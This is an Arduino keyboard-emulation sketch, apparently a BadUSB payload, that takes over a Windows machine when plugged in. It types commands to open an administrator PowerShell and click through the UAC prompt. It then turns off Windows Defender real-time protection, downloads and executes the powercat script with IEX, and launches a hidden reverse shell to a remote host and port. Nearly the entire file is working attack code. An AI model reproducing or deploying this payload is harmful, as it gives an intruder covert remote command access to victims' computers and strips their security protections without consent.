/* 
   This module uses powercat to send a powershell, with the user's priviledges, at remote host's port 443.
   
   Author: Littlepwnie
   https://github.com/littlepwnie/
*/

#include <HID.h>
#include <Keyboard.h>

// Init function
void setup()
{
  // Start Keyboard and Mouse
  Keyboard.begin();

  // Start Payload
  // press Windows+X and launch Powershell
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.press('x');
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(1000);

  // Bypass UAC
  typeKey(KEY_LEFT_ARROW);
  delay(100);
  typeKey(KEY_RETURN);
  delay(300);

  // disable windows defender
  Keyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
  typeKey(KEY_RETURN);  
  delay(500);  
  
  // download payload
  Keyboard.println("IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')");
  typeKey(KEY_RETURN);  
  delay(500);

  // run a client in the background
  Keyboard.print("PowerShell.exe -windowstyle hidden { powercat -c <rhost> -p <rport> -e cmd }");
  typeKey(KEY_RETURN);
  delay(100);
  
  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}
